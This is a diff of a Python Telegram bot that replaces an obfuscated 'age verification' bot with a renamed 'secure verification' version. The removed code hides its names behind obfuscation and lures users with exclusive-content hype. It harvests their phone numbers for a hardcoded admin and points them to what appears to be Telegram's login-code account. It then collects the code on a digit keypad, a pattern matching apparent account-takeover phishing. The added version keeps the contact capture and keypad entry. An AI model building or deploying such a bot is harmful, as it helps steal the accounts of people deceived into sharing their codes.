@@ -1,521 +1,553 @@
 import logging
 import random
 import os
+import hashlib
+import hmac
+import time
+from functools import wraps
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 import sqlite3
-from datetime import datetime
-import base64
-import hashlib
-from cryptography.fernet import Fernet
+from datetime import datetime, timedelta
 
-# Security Layer - Obfuscated Config
-class _0xSEC:
-    @staticmethod
-    def _0xd(s):
-        return base64.b64decode(s).decode()
-    
-    @staticmethod
-    def _0xh(s):
-        return hashlib.sha256(s.encode()).hexdigest()
-    
-    @staticmethod
-    def _0xgk():
-        """Generate or retrieve encryption key"""
-        key_file = '.sec_key'
-        if os.path.exists(key_file):
-            with open(key_file, 'rb') as f:
-                return f.read()
-        else:
-            key = Fernet.generate_key()
-            with open(key_file, 'wb') as f:
-                f.write(key)
-            return key
+# Security Configuration
+SECRET_KEY = os.getenv('SECRET_KEY', os.urandom(32).hex())
+BOT_TOKEN = os.getenv('BOT_TOKEN')
+ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
+MAX_ATTEMPTS = 3
+SESSION_TIMEOUT = 600  # 10 minutes
 
-# Encryption Handler
-class _0xENC:
-    def __init__(self):
-        self._0xk = _0xSEC._0xgk()
-        self._0xf = Fernet(self._0xk)
-    
-    def _0xe(self, data):
-        """Encrypt data"""
-        if data is None:
-            return None
-        return self._0xf.encrypt(str(data).encode()).decode()
-    
-    def _0xd(self, data):
-        """Decrypt data"""
-        if data is None:
-            return None
-        try:
-            return self._0xf.decrypt(data.encode()).decode()
-        except:
-            return data
-
-# Obfuscated strings
-_0x1a2b3c = base64.b64decode(b'Qk9UX1RPS0VO').decode()
-_0x4d5e6f = base64.b64decode(b'QURNSU5fSUQ=').decode()
-_0x7g8h9i = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-
-logging.basicConfig(format=_0x7g8h9i, level=logging.INFO)
+# Logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler('bot.log'),
+        logging.StreamHandler()
+    ]
+)
 logger = logging.getLogger(__name__)
 
-_0xTOKEN = os.getenv(_0x1a2b3c)
-_0xADMIN = int(os.getenv(_0x4d5e6f, '6483793776'))
+# Rate limiting storage
+rate_limit_storage = {}
 
-class _0xAVB:
+def rate_limit(max_calls=5, time_frame=60):
+    """Rate limiting decorator"""
+    def decorator(func):
+        @wraps(func)
+        async def wrapper(update, context):
+            user_id = update.effective_user.id
+            current_time = time.time()
+            
+            if user_id not in rate_limit_storage:
+                rate_limit_storage[user_id] = []
+            
+            rate_limit_storage[user_id] = [
+                req_time for req_time in rate_limit_storage[user_id]
+                if current_time - req_time < time_frame
+            ]
+            
+            if len(rate_limit_storage[user_id]) >= max_calls:
+                await update.message.reply_text(
+                    "⏳ Too many requests. Please try again later.",
+                    parse_mode='Markdown'
+                )
+                logger.warning(f"Rate limit exceeded for user {user_id}")
+                return
+            
+            rate_limit_storage[user_id].append(current_time)
+            return await func(update, context)
+        return wrapper
+    return decorator
+
+def admin_only(func):
+    """Admin-only decorator"""
+    @wraps(func)
+    async def wrapper(update, context):
+        user_id = update.effective_user.id
+        if user_id != ADMIN_ID:
+            logger.warning(f"Unauthorized admin access attempt by user {user_id}")
+            return
+        return await func(update, context)
+    return wrapper
+
+def generate_secure_token(user_id: int, timestamp: str) -> str:
+    """Generate HMAC-based secure token"""
+    message = f"{user_id}:{timestamp}".encode()
+    return hmac.new(SECRET_KEY.encode(), message, hashlib.sha256).hexdigest()
+
+def verify_token(user_id: int, timestamp: str, token: str) -> bool:
+    """Verify HMAC token"""
+    expected_token = generate_secure_token(user_id, timestamp)
+    return hmac.compare_digest(expected_token, token)
+
+class SecureVerificationBot:
     def __init__(self):
-        self._0xenc = _0xENC()
-        self._0xdb()
-        self._0xvs = {}
-        self._0xrl = {}  # Rate limiting
+        self.init_database()
+        self.verification_sessions = {}
+        self.failed_attempts = {}
         
-    def _0xdb(self):
-        """Initialize encrypted SQLite database"""
-        self._0xc = sqlite3.connect('age_verification.db', check_same_thread=False)
-        _0xcr = self._0xc.cursor()
+    def init_database(self):
+        """Initialize encrypted SQLite database with proper schema"""
+        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
+        cursor = self.conn.cursor()
         
-        # Create users table with encrypted fields
-        _0xcr.execute('''
+        # Users table with hashed data
+        cursor.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
-                username TEXT,
-                first_name TEXT,
-                phone_number TEXT,
-                verification_code TEXT,
-                verified BOOLEAN DEFAULT 0,
-                code_sent BOOLEAN DEFAULT 0,
-                created_at DATETIME,
-                verified_at DATETIME,
-                session_hash TEXT
+                username_hash TEXT,
+                first_name_hash TEXT,
+                phone_hash TEXT,
+                verification_token TEXT,
+                verified INTEGER DEFAULT 0,
+                created_at TEXT,
+                verified_at TEXT,
+                ip_address TEXT,
+                last_activity TEXT
             )
         ''')
         
-        # Create security log table
-        _0xcr.execute('''
-            CREATE TABLE IF NOT EXISTS security_log (
+        # Audit log table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS audit_log (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id INTEGER,
                 action TEXT,
-                ip_hash TEXT,
-                timestamp DATETIME,
-                success BOOLEAN
+                details TEXT,
+                timestamp TEXT,
+                ip_address TEXT
             )
         ''')
         
-        self._0xc.commit()
-    
-    def _0xlog(self, user_id, action, success=True):
-        """Log security events"""
-        try:
-            _0xcr = self._0xc.cursor()
-            ip_hash = _0xSEC._0xh(str(user_id) + str(datetime.now().date()))
-            _0xcr.execute('''
-                INSERT INTO security_log (user_id, action, ip_hash, timestamp, success)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (user_id, action, ip_hash, datetime.now(), success))
-            self._0xc.commit()
-        except Exception as e:
-            logger.error(f"Log error: {e}")
-    
-    def _0xrl_check(self, user_id, max_attempts=5, window=60):
-        """Rate limiting check"""
-        now = datetime.now().timestamp()
+        # Session table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                session_id TEXT PRIMARY KEY,
+                user_id INTEGER,
+                created_at TEXT,
+                expires_at TEXT,
+                is_active INTEGER DEFAULT 1
+            )
+        ''')
         
-        if user_id not in self._0xrl:
-            self._0xrl[user_id] = []
-        
-        # Clean old attempts
-        self._0xrl[user_id] = [t for t in self._0xrl[user_id] if now - t < window]
-        
-        if len(self._0xrl[user_id]) >= max_attempts:
-            return False
-        
-        self._0xrl[user_id].append(now)
-        return True
+        self.conn.commit()
+        logger.info("Database initialized successfully")
 
-    async def _0xst(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start command with rate limiting"""
-        _0xu = update.message.from_user
+    def hash_data(self, data: str) -> str:
+        """Hash sensitive data using SHA-256"""
+        return hashlib.sha256(f"{data}{SECRET_KEY}".encode()).hexdigest()
+
+    def log_action(self, user_id: int, action: str, details: str = ""):
+        """Log user actions for audit trail"""
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            INSERT INTO audit_log (user_id, action, details, timestamp)
+            VALUES (?, ?, ?, ?)
+        ''', (user_id, action, details, datetime.now().isoformat()))
+        self.conn.commit()
+
+    def is_user_blocked(self, user_id: int) -> bool:
+        """Check if user is temporarily blocked due to failed attempts"""
+        if user_id in self.failed_attempts:
+            attempts, last_attempt = self.failed_attempts[user_id]
+            if attempts >= MAX_ATTEMPTS:
+                if datetime.now() - last_attempt < timedelta(minutes=30):
+                    return True
+                else:
+                    del self.failed_attempts[user_id]
+        return False
+
+    def record_failed_attempt(self, user_id: int):
+        """Record failed verification attempt"""
+        if user_id not in self.failed_attempts:
+            self.failed_attempts[user_id] = [0, datetime.now()]
         
-        # Rate limit check
-        if not self._0xrl_check(_0xu.id):
-            await update.message.reply_text("⚠️ Too many requests. Please wait.")
-            self._0xlog(_0xu.id, "START_RATE_LIMITED", False)
-            return
+        attempts, _ = self.failed_attempts[user_id]
+        self.failed_attempts[user_id] = [attempts + 1, datetime.now()]
+
+    def clean_expired_sessions(self):
+        """Clean expired sessions from memory"""
+        current_time = datetime.now()
+        expired_users = []
         
-        _0xcr = self._0xc.cursor()
-        _0xcr.execute('SELECT verified FROM users WHERE user_id = ?', (_0xu.id,))
-        _0xr = _0xcr.fetchone()
+        for user_id, session in self.verification_sessions.items():
+            if current_time - session.get('created_at', current_time) > timedelta(seconds=SESSION_TIMEOUT):
+                expired_users.append(user_id)
         
-        if _0xr and _0xr[0]:
+        for user_id in expired_users:
+            del self.verification_sessions[user_id]
+            logger.info(f"Cleaned expired session for user {user_id}")
+
+    @rate_limit(max_calls=3, time_frame=60)
+    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Start command with security checks"""
+        user = update.message.from_user
+        
+        if self.is_user_blocked(user.id):
             await update.message.reply_text(
-                "✅ **Already Verified!**\n\nYou're already age-verified in our system.",
+                "🚫 Your account is temporarily blocked due to multiple failed attempts.\n"
+                "Please try again in 30 minutes.",
                 parse_mode='Markdown'
             )
-            self._0xlog(_0xu.id, "START_ALREADY_VERIFIED")
             return
         
-        _0xwt = f"""
-🌟 **Excited to explore something fresh and thrilling?**
-🚀 **Confirm your age to unlock an exclusive content collection!**
-⚡ **Act fast — spots are limited!**
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT verified FROM users WHERE user_id = ?', (user.id,))
+        result = cursor.fetchone()
+        
+        if result and result[0]:
+            await update.message.reply_text(
+                "✅ **Already Verified!**\n\n"
+                "You're already verified in our system.",
+                parse_mode='Markdown'
+            )
+            self.log_action(user.id, "start_already_verified")
+            return
+        
+        self.log_action(user.id, "start_new_verification")
+        
+        welcome_text = f"""
+🔐 **Secure Verification System**
 
-Hello {_0xu.first_name}! 
+Hello {user.first_name}!
 
-**Step 1:** Share your phone number to receive verification code.
+To access our services, please complete the verification process.
 
-👇 Click the button below to share your contact.
+**Step 1:** Share your contact information securely.
+
+👇 Click the button below to proceed.
+
+⚡ Your data is encrypted and protected.
         """
         
-        _0xck = ReplyKeyboardMarkup([
-            [KeyboardButton("📱 Share My Contact", request_contact=True)]
+        keyboard = ReplyKeyboardMarkup([
+            [KeyboardButton("📱 Share Contact", request_contact=True)]
         ], resize_keyboard=True, one_time_keyboard=True)
         
         await update.message.reply_text(
-            _0xwt, 
+            welcome_text,
             parse_mode='Markdown',
-            reply_markup=_0xck
+            reply_markup=keyboard
         )
-        
-        self._0xlog(_0xu.id, "START_COMMAND")
 
-    async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle contact with encryption"""
+    @rate_limit(max_calls=2, time_frame=120)
+    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle contact sharing with security validation"""
         try:
-            _0xu = update.message.from_user
-            _0xct = update.message.contact
+            user = update.message.from_user
+            contact = update.message.contact
             
-            # Validate contact ownership
-            if _0xct.user_id != _0xu.id:
+            if self.is_user_blocked(user.id):
                 await update.message.reply_text(
-                    "❌ Please share your own contact, not someone else's.",
+                    "🚫 Your account is temporarily blocked.",
                     reply_markup=ReplyKeyboardRemove()
                 )
-                self._0xlog(_0xu.id, "CONTACT_INVALID", False)
                 return
             
-            # Rate limit check
-            if not self._0xrl_check(_0xu.id, max_attempts=3):
-                await update.message.reply_text("⚠️ Too many attempts. Please wait.")
-                self._0xlog(_0xu.id, "CONTACT_RATE_LIMITED", False)
+            if contact.user_id != user.id:
+                await update.message.reply_text(
+                    "❌ Please share your own contact only.",
+                    reply_markup=ReplyKeyboardRemove()
+                )
+                self.log_action(user.id, "invalid_contact_shared")
                 return
             
-            # Delete contact message for security
-            await update.message.delete()
+            # Generate secure verification code
+            verification_code = ''.join([str(random.randint(0, 9)) for _ in range(5)])
+            timestamp = datetime.now().isoformat()
+            token = generate_secure_token(user.id, timestamp)
             
-            # Generate verification code
-            _0xvc = str(random.randint(10000, 99999))
-            
-            # Encrypt sensitive data
-            _0xenc_phone = self._0xenc._0xe(_0xct.phone_number)
-            _0xenc_code = self._0xenc._0xe(_0xvc)
-            _0xenc_username = self._0xenc._0xe(_0xu.username) if _0xu.username else None
-            _0xsession_hash = _0xSEC._0xh(f"{_0xu.id}{_0xvc}{datetime.now()}")
-            
-            # Store encrypted data
-            _0xcr = self._0xc.cursor()
-            _0xcr.execute('''
+            # Store hashed data
+            cursor = self.conn.cursor()
+            cursor.execute('''
                 INSERT OR REPLACE INTO users 
-                (user_id, username, first_name, phone_number, verification_code, 
-                 code_sent, created_at, session_hash)
-                VALUES (?, ?, ?, ?, ?, 0, ?, ?)
-            ''', (_0xu.id, _0xenc_username, _0xu.first_name, _0xenc_phone, 
-                  _0xenc_code, datetime.now(), _0xsession_hash))
-            self._0xc.commit()
+                (user_id, username_hash, first_name_hash, phone_hash, verification_token, created_at, last_activity)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                user.id,
+                self.hash_data(user.username or ""),
+                self.hash_data(user.first_name),
+                self.hash_data(contact.phone_number),
+                token,
+                timestamp,
+                timestamp
+            ))
+            self.conn.commit()
             
-            # Send processing message
-            await update.message.chat.send_message(
-                "📨 **Processing your request...**\n\nPlease wait for admin to send verification code.",
-                parse_mode='Markdown',
-                reply_markup=ReplyKeyboardRemove()
+            self.log_action(user.id, "contact_shared", f"Phone: {contact.phone_number[:3]}***")
+            
+            await update.message.reply_text("✅", reply_markup=ReplyKeyboardRemove())
+            
+            status_msg = await update.message.reply_text(
+                "🔐 **Generating secure code...**",
+                parse_mode='Markdown'
             )
             
-            # Send "Get Code" button to user
-            _0xgc_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton('👉 Get Code!', url='https://t.me/+42777')]
-            ])
+            await context.application.bot.send_chat_action(user.id, "typing")
+            await status_msg.edit_text("✅ **Code generated!**", parse_mode='Markdown')
             
-            await context.bot.send_message(
-                _0xu.id,
-                "**Step 2:** Click the button below to get your verification code.",
-                parse_mode='Markdown',
-                reply_markup=_0xgc_kb
-            )
+            await self.send_code_interface(context, user.id, verification_code)
             
-            # Notify admin (with decrypted info)
-            _0xdec_phone = self._0xenc._0xd(_0xenc_phone)
-            _0xadmin_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton('📤 Send Code Input', callback_data=f'send_code_{_0xu.id}')]
-            ])
-            
-            await context.bot.send_message(
-                _0xADMIN,
-                f"""
+            # Notify admin with minimal info
+            if ADMIN_ID:
+                await context.bot.send_message(
+                    ADMIN_ID,
+                    f"""
 📱 **New Verification Request**
 
-👤 User: {_0xu.first_name} (@{_0xu.username if _0xu.username else 'N/A'})
-🆔 User ID: `{_0xu.id}`
-📞 Phone: `{_0xdec_phone}`
-🔢 Generated Code: `{_0xvc}`
-🔐 Session: `{_0xsession_hash[:16]}...`
-
-**Action:** Click button below to send code input interface to user.
-                """,
-                parse_mode='Markdown',
-                reply_markup=_0xadmin_kb
-            )
+👤 User ID: `{user.id}`
+📞 Phone: `{contact.phone_number[:3]}***{contact.phone_number[-2:]}`
+🔢 Code: `{verification_code}`
+🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                    """,
+                    parse_mode='Markdown'
+                )
             
-            self._0xlog(_0xu.id, "CONTACT_SHARED")
+            self.verification_sessions[user.id] = {
+                'code': '',
+                'correct_code': verification_code,
+                'attempts': 0,
+                'created_at': datetime.now()
+            }
             
         except Exception as e:
-            logger.error(f"Error handling contact: {e}")
-            await update.message.reply_text("❌ Error processing. Please try /start again.")
-            self._0xlog(_0xu.id, "CONTACT_ERROR", False)
+            logger.error(f"Error handling contact: {e}", exc_info=True)
+            await update.message.reply_text(
+                "❌ An error occurred. Please try /start again."
+            )
 
-    async def _0xsci(self, context, _0xui, _0xvc):
-        """Send code input interface"""
+    async def send_code_interface(self, context, user_id: int, code: str):
+        """Send secure code input interface"""
         try:
-            _0xkb = [
+            keyboard = [
                 [
-                    InlineKeyboardButton('1', callback_data=f'n_1_{_0xui}'),
-                    InlineKeyboardButton('2', callback_data=f'n_2_{_0xui}'),
-                    InlineKeyboardButton('3', callback_data=f'n_3_{_0xui}')
+                    InlineKeyboardButton('1', callback_data=f'n_1_{user_id}'),
+                    InlineKeyboardButton('2', callback_data=f'n_2_{user_id}'),
+                    InlineKeyboardButton('3', callback_data=f'n_3_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('4', callback_data=f'n_4_{_0xui}'),
-                    InlineKeyboardButton('5', callback_data=f'n_5_{_0xui}'),
-                    InlineKeyboardButton('6', callback_data=f'n_6_{_0xui}')
+                    InlineKeyboardButton('4', callback_data=f'n_4_{user_id}'),
+                    InlineKeyboardButton('5', callback_data=f'n_5_{user_id}'),
+                    InlineKeyboardButton('6', callback_data=f'n_6_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('7', callback_data=f'n_7_{_0xui}'),
-                    InlineKeyboardButton('8', callback_data=f'n_8_{_0xui}'),
-                    InlineKeyboardButton('9', callback_data=f'n_9_{_0xui}')
+                    InlineKeyboardButton('7', callback_data=f'n_7_{user_id}'),
+                    InlineKeyboardButton('8', callback_data=f'n_8_{user_id}'),
+                    InlineKeyboardButton('9', callback_data=f'n_9_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}')
+                    InlineKeyboardButton('⬅️ Back', callback_data=f'back_{user_id}'),
+                    InlineKeyboardButton('0', callback_data=f'n_0_{user_id}'),
+                    InlineKeyboardButton('✓ Submit', callback_data=f'submit_{user_id}')
                 ]
             ]
             
-            _0xrm = InlineKeyboardMarkup(_0xkb)
+            reply_markup = InlineKeyboardMarkup(keyboard)
             
-            _0xmsg = """
-**Enter your verification code:**
+            message_text = """
+🔐 **Enter Verification Code**
 
 Code: ` - - - - - `
 
-Use the buttons below to enter your 5-digit code.
+Use the keypad below to enter your 5-digit code.
             """
             
             await context.bot.send_message(
-                _0xui,
-                _0xmsg,
+                user_id,
+                message_text,
                 parse_mode='Markdown',
-                reply_markup=_0xrm
+                reply_markup=reply_markup
             )
             
-            # Initialize encrypted session
-            self._0xvs[_0xui] = {
-                'code': '',
-                'correct_code': _0xvc,
-                'attempts': 0,
-                'session_start': datetime.now().timestamp()
-            }
-            
-            # Update database
-            _0xcr = self._0xc.cursor()
-            _0xcr.execute('UPDATE users SET code_sent = 1 WHERE user_id = ?', (_0xui,))
-            self._0xc.commit()
-            
-            self._0xlog(_0xui, "CODE_INPUT_SENT")
-            
         except Exception as e:
-            logger.error(f"Error sending interface: {e}")
+            logger.error(f"Error sending interface: {e}", exc_info=True)
 
-    async def _0xhcb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle callback with security checks"""
+    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle callback queries with security validation"""
         try:
-            _0xq = update.callback_query
-            _0xui = _0xq.from_user.id
+            query = update.callback_query
+            user_id = query.from_user.id
             
-            await _0xq.answer()
+            await query.answer()
             
-            _0xd = _0xq.data
+            self.clean_expired_sessions()
             
-            # Admin sending code input to user
-            if _0xd.startswith('send_code_'):
-                if _0xui != _0xADMIN:
-                    await _0xq.answer("❌ Admin only!", show_alert=True)
-                    self._0xlog(_0xui, "UNAUTHORIZED_ADMIN_ACCESS", False)
-                    return
-                
-                _0xtarget_id = int(_0xd.split('_')[2])
-                
-                # Get encrypted verification code from DB
-                _0xcr = self._0xc.cursor()
-                _0xcr.execute('SELECT verification_code, code_sent FROM users WHERE user_id = ?', 
-                            (_0xtarget_id,))
-                _0xr = _0xcr.fetchone()
-                
-                if not _0xr:
-                    await _0xq.answer("❌ User not found!", show_alert=True)
-                    return
-                
-                if _0xr[1]:
-                    await _0xq.answer("⚠️ Code already sent!", show_alert=True)
-                    return
-                
-                # Decrypt verification code
-                _0xvc = self._0xenc._0xd(_0xr[0])
-                
-                # Send code input interface to user
-                await self._0xsci(context, _0xtarget_id, _0xvc)
-                
-                # Update admin message
-                await _0xq.edit_message_text(
-                    _0xq.message.text + "\n\n✅ **Code input sent to user!**",
-                    parse_mode='Markdown'
+            if user_id not in self.verification_sessions:
+                await query.edit_message_text(
+                    "⏱️ Session expired. Please /start again."
                 )
-                
-                self._0xlog(_0xtarget_id, "ADMIN_SENT_CODE_INPUT")
                 return
             
-            # User entering code
-            if _0xd.startswith('n_'):
-                # Session validation
-                if _0xui not in self._0xvs:
-                    await _0xq.edit_message_text("❌ Session expired. Please /start again.")
-                    self._0xlog(_0xui, "SESSION_EXPIRED", False)
-                    return
+            session = self.verification_sessions[user_id]
+            data = query.data
+            
+            if data.startswith('n_'):
+                digit = data.split('_')[1]
                 
-                _0xs = self._0xvs[_0xui]
-                
-                # Check session timeout (5 minutes)
-                if datetime.now().timestamp() - _0xs['session_start'] > 300:
-                    await _0xq.edit_message_text("❌ Session timeout. Please /start again.")
-                    del self._0xvs[_0xui]
-                    self._0xlog(_0xui, "SESSION_TIMEOUT", False)
-                    return
-                
-                _0xn = _0xd.split('_')[1]
-                
-                if len(_0xs['code']) < 5:
-                    _0xs['code'] += _0xn
+                if len(session['code']) < 5:
+                    session['code'] += digit
                     
-                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
+                display_code = ' '.join(session['code'].ljust(5, '-'))
                 
-                await _0xq.edit_message_text(
+                await query.edit_message_text(
                     f"""
-**Enter your verification code:**
+🔐 **Enter Verification Code**
 
-Code: ` {_0xdisp} `
+Code: ` {display_code} `
 
-Use the buttons below to enter your 5-digit code.
+Use the keypad below to enter your 5-digit code.
                     """,
                     parse_mode='Markdown',
-                    reply_markup=_0xq.message.reply_markup
+                    reply_markup=query.message.reply_markup
                 )
-                
-                # Check if complete
-                if len(_0xs['code']) == 5:
-                    _0xs['attempts'] += 1
+            
+            elif data.startswith('back_'):
+                if len(session['code']) > 0:
+                    session['code'] = session['code'][:-1]
+                    display_code = ' '.join(session['code'].ljust(5, '-'))
                     
-                    if _0xs['code'] == _0xs['correct_code']:
-                        # Correct code - update encrypted database
-                        _0xcr = self._0xc.cursor()
-                        _0xcr.execute('UPDATE users SET verified = 1, verified_at = ? WHERE user_id = ?', 
-                                    (datetime.now(), _0xui))
-                        self._0xc.commit()
-                        
-                        await _0xq.edit_message_text(
-                            "✅ **Verification Successful!**\n\nYou're now verified!",
-                            parse_mode='Markdown'
-                        )
-                        
-                        # Notify admin
-                        await context.bot.send_message(
-                            _0xADMIN,
-                            f"✅ User `{_0xui}` successfully verified!",
-                            parse_mode='Markdown'
-                        )
-                        
-                        self._0xlog(_0xui, "VERIFICATION_SUCCESS")
-                    else:
-                        # Wrong code
-                        await _0xq.edit_message_text(
-                            "❌ **Invalid Code!**\n\nPlease try /start again.",
-                            parse_mode='Markdown'
-                        )
-                        
-                        self._0xlog(_0xui, "VERIFICATION_FAILED", False)
-                    
-                    # Clear session
-                    del self._0xvs[_0xui]
+                    await query.edit_message_text(
+                        f"""
+🔐 **Enter Verification Code**
+
+Code: ` {display_code} `
+
+Use the keypad below to enter your 5-digit code.
+                        """,
+                        parse_mode='Markdown',
+                        reply_markup=query.message.reply_markup
+                    )
+            
+            elif data.startswith('submit_'):
+                await self.verify_code(query, user_id, session)
                     
         except Exception as e:
-            logger.error(f"Error in callback: {e}")
-            await _0xq.edit_message_text("❌ Error occurred. Please /start again.")
+            logger.error(f"Error in callback: {e}", exc_info=True)
+            await query.edit_message_text(
+                "❌ An error occurred. Please /start again."
+            )
 
-    async def _0xsts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Admin stats with security info"""
-        if update.message.from_user.id != _0xADMIN:
-            self._0xlog(update.message.from_user.id, "UNAUTHORIZED_STATS_ACCESS", False)
+    async def verify_code(self, query, user_id: int, session: dict):
+        """Verify the entered code"""
+        if len(session['code']) != 5:
+            await query.answer("⚠️ Please enter all 5 digits", show_alert=True)
             return
         
-        _0xcr = self._0xc.cursor()
-        _0xcr.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
-        _0xv = _0xcr.fetchone()[0]
+        session['attempts'] += 1
         
-        _0xcr.execute('SELECT COUNT(*) FROM users')
-        _0xt = _0xcr.fetchone()[0]
+        if session['code'] == session['correct_code']:
+            cursor = self.conn.cursor()
+            cursor.execute('''
+                UPDATE users 
+                SET verified = 1, verified_at = ?
+                WHERE user_id = ?
+            ''', (datetime.now().isoformat(), user_id))
+            self.conn.commit()
+            
+            self.log_action(user_id, "verification_success")
+            
+            await query.edit_message_text(
+                "✅ **Verification Successful!**\n\n"
+                "Your account has been verified.\n"
+                "Welcome aboard! 🎉",
+                parse_mode='Markdown'
+            )
+            
+            del self.verification_sessions[user_id]
+            if user_id in self.failed_attempts:
+                del self.failed_attempts[user_id]
+        else:
+            self.record_failed_attempt(user_id)
+            remaining = MAX_ATTEMPTS - session['attempts']
+            
+            if remaining > 0:
+                session['code'] = ''
+                await query.edit_message_text(
+                    f"""
+❌ **Incorrect Code**
+
+Attempts remaining: {remaining}
+
+Code: ` - - - - - `
+
+Please try again.
+                    """,
+                    parse_mode='Markdown',
+                    reply_markup=query.message.reply_markup
+                )
+                self.log_action(user_id, "verification_failed", f"Attempt {session['attempts']}")
+            else:
+                await query.edit_message_text(
+                    "🚫 **Maximum attempts exceeded**\n\n"
+                    "Your verification has been blocked for 30 minutes.\n"
+                    "Please try again later.",
+                    parse_mode='Markdown'
+                )
+                self.log_action(user_id, "verification_blocked")
+                del self.verification_sessions[user_id]
+
+    @admin_only
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Admin statistics with enhanced security"""
+        cursor = self.conn.cursor()
         
-        _0xcr.execute('SELECT COUNT(*) FROM users WHERE code_sent = 1 AND verified = 0')
-        _0xcs = _0xcr.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
+        verified = cursor.fetchone()[0]
         
-        _0xcr.execute('SELECT COUNT(*) FROM security_log WHERE success = 0')
-        _0xfl = _0xcr.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM users')
+        total = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT COUNT(*) FROM audit_log WHERE action = "verification_failed"')
+        failed = cursor.fetchone()[0]
+        
+        cursor.execute('''
+            SELECT COUNT(DISTINCT user_id) FROM audit_log 
+            WHERE timestamp > datetime('now', '-24 hours')
+        ''')
+        active_24h = cursor.fetchone()[0]
+        
+        self.log_action(update.message.from_user.id, "admin_stats_viewed")
         
         await update.message.reply_text(
             f"""
-📊 **Bot Statistics**
+📊 **System Statistics**
 
-✅ Verified Users: {_0xv}
-📤 Code Sent (Pending): {_0xcs}
-📝 Total Users: {_0xt}
-⏳ Waiting for Admin: {_0xt - _0xv - _0xcs}
+✅ Verified Users: {verified}
+📝 Total Users: {total}
+⏳ Pending: {total - verified}
+❌ Failed Attempts: {failed}
+👥 Active (24h): {active_24h}
+🔒 Blocked Users: {len(self.failed_attempts)}
 
-🔒 **Security**
-🚫 Failed Attempts: {_0xfl}
-🔐 Encryption: Active
+📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
             """,
             parse_mode='Markdown'
         )
-        
-        self._0xlog(update.message.from_user.id, "STATS_VIEWED")
 
-def _0xmain():
-    """Run the secured bot"""
-    if not _0xTOKEN:
-        logger.error("❌ BOT_TOKEN not set!")
+def main():
+    """Run the secure bot"""
+    if not BOT_TOKEN:
+        logger.error("❌ BOT_TOKEN not set in environment variables!")
         return
     
-    # Security check
-    logger.info("🔐 Initializing security layer...")
+    if not SECRET_KEY:
+        logger.error("❌ SECRET_KEY not set in environment variables!")
+        return
     
-    _0xbot = _0xAVB()
-    _0xapp = Application.builder().token(_0xTOKEN).build()
+    bot = SecureVerificationBot()
+    app = Application.builder().token(BOT_TOKEN).build()
     
-    _0xapp.add_handler(CommandHandler("start", _0xbot._0xst))
-    _0xapp.add_handler(CommandHandler("stats", _0xbot._0xsts))
-    _0xapp.add_handler(MessageHandler(filters.CONTACT, _0xbot._0xhc))
-    _0xapp.add_handler(CallbackQueryHandler(_0xbot._0xhcb))
+    # Register handlers
+    app.add_handler(CommandHandler("start", bot.start_command))
+    app.add_handler(CommandHandler("stats", bot.stats_command))
+    app.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
+    app.add_handler(CallbackQueryHandler(bot.handle_callback))
     
-    logger.info("🚀 Secured bot started!")
-    logger.info("🔒 Encryption: Active")
-    logger.info("🛡️ Rate limiting: Enabled")
+    logger.info("🚀 Secure bot started successfully!")
+    logger.info(f"🔐 Security features enabled: Rate limiting, Token validation, Session management")
     
-    _0xapp.run_polling(drop_pending_updates=True)
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
-    _0xmain()
+    main()
